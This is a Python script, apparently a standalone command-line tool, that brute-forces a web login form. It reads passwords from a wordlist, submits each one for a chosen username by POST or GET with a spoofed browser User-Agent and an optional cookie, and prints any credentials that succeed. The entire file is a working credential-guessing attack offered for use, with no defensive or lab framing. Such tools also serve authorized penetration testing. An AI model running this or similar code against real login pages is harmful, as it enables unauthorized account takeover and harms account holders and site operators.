import requests
import sys

GREEN = '\033[92m' if sys.stdout.isatty() else ''
RED = '\033[91m' if sys.stdout.isatty() else ''
RESET = '\033[0m' if sys.stdout.isatty() else ''

print("=== Login Brute-Force Tool ===")
url = input("Enter the login page URL (e.g., https://example.com/login): ")
username = input("Enter the username to test: ")
password_file = input("Enter the path to your password file: ")
login_failed_string = input("Enter the text shown when login fails (e.g., 'Invalid credentials'): ")
print("\nSelect HTTP request type:")
print("1. POST")
print("2. GET")
request_type = input("Enter the number for request type (1 or 2): ")
cookie_value = input("Enter value of Cookie (optional, press Enter to skip): ")

def cracking(username, url, password_file, login_failed_string, request_type, cookie_value):
    
    if not url.startswith(('http://', 'https://')):
        print(f"\n{RED}❌ Error: URL must start with 'http://' or 'https://'.{RESET}")
        return False

    if request_type not in ['1', '2']:
        print(f"\n{RED}❌ Error: Invalid request type. Please select 1 (POST) or 2 (GET).{RESET}")
        return False

    try:
        with open(password_file, 'r', encoding='utf-8') as p:
            passwords = [line.strip() for line in p if line.strip()]
            if not passwords:
                print(f"\n{RED}❌ Error: The password file is empty.{RESET}")
                return False

        total_passwords = len(passwords)
        print(f"\nStarting brute-force for username '{username}'...")
        print(f"Total passwords to try: {total_passwords}")
        print(f"Request type: {'POST' if request_type == '1' else 'GET'}")
        if cookie_value:
            print(f"Using Cookie: {cookie_value}")
        else:
            print("No Cookie provided")
        print("-" * 40)

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if cookie_value:
            session.headers.update({'Cookie': cookie_value})

        for i, password in enumerate(passwords, 1):
            print(f"Trying password {i}/{total_passwords}: {password}")
            data = {'username': username, 'password': password, 'Login': 'submit'}

            try:
                if request_type == '1':
                    response = session.post(url, data=data, timeout=5, allow_redirects=True)
                else:
                    response = session.get(url, params=data, timeout=5, allow_redirects=True)

                if login_failed_string.lower() in response.text.lower():
                    print(f"{RED}  ↳ Failed{RESET}")
                else:
                    print(f"\n{GREEN}✅ Success! Valid credentials found:{RESET}")
                    print(f"{GREEN}Username: {username}{RESET}")
                    print(f"{GREEN}Password: {password}{RESET}")
                    if cookie_value:
                        print(f"{GREEN}Cookie: {cookie_value}{RESET}")
                    print(f"{GREEN}{'-' * 40}{RESET}")
                    return True

            except requests.RequestException as e:
                print(f"{RED}  ↳ Network error: {str(e).split(':')[0]}. Continuing...{RESET}")

        print(f"\n{RED}❌ No valid password found in the list.{RESET}")
        return False

    except FileNotFoundError:
        print(f"\n{RED}❌ Error: Password file '{password_file}' not found. Please check the file path.{RESET}")
        return False
    except UnicodeDecodeError:
        print(f"\n{RED}❌ Error: Password file must be a text file (UTF-8 encoded).{RESET}")
        return False
    except Exception as e:
        print(f"\n{RED}❌ Unexpected error: {e}. Please try again.{RESET}")
        return False

print("\nResults:")
print("=" * 40)
if not cracking(username, url, password_file, login_failed_string, request_type, cookie_value):
    print(f"{RED}Brute-force attempt completed with no success.{RESET}")
print("=" * 40)

